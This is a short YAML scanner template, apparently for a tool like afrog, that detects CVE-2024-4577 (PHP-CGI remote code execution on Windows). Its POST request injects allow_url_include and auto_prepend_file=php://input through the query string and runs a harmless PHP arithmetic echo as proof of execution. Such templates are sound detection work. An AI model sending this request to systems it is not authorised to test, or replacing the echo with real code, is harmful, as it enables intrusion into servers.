id: CVE-2024-4577
info:
  name: PHP CGI Windows平台远程代码执行漏洞
  author: zan8in
  severity: critical
  verified: true
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/139547168
    - https://mp.weixin.qq.com/s/93TuxZ4AVqHXcnJw3M4hRg
    - https://mp.weixin.qq.com/s/gre1Th9U5NMryyd2pYpTbQ
  tags: cve,cve2024,php,rce
  created: 2024/06/11

set:
  num1: randomInt(1000, 6666)
  num2: randomInt(6666, 9999)
rules:
  r0:
    request:
      method: POST
      path: /php-cgi/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input
      body: "<?php echo {{num1}}*{{num2}};?>"
    expression: response.body.bcontains(bytes(string(num1*num2)))
expression: r0()
